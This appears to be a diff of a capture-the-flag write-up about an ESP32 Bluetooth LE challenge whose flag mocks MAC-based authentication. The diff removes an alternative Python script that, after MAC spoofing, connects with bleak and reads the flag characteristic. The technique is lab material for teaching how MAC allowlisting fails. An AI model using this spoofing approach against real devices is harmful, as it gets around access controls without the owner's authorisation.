@@ -86,26 +86,6 @@ WOCSA{mac_auth_is_not_real_security}
 
 ---
 
-## Alternative: Python Script
-
-```python
-import asyncio
-from bleak import BleakClient
-
-# Run AFTER spoofing your MAC to DE:AD:BE:EF:CA:FE
-MAC = "AA:BB:CC:DD:EE:FF"  # ESP32's MAC
-FLAG_UUID = "cafebabe-0001-1000-8000-00805f9b34fb"
-
-async def main():
-    async with BleakClient(MAC) as client:
-        value = await client.read_gatt_char(FLAG_UUID)
-        print(value.decode())
-
-asyncio.run(main())
-```
-
----
-
 ## 🎯 Flag
 
 ```
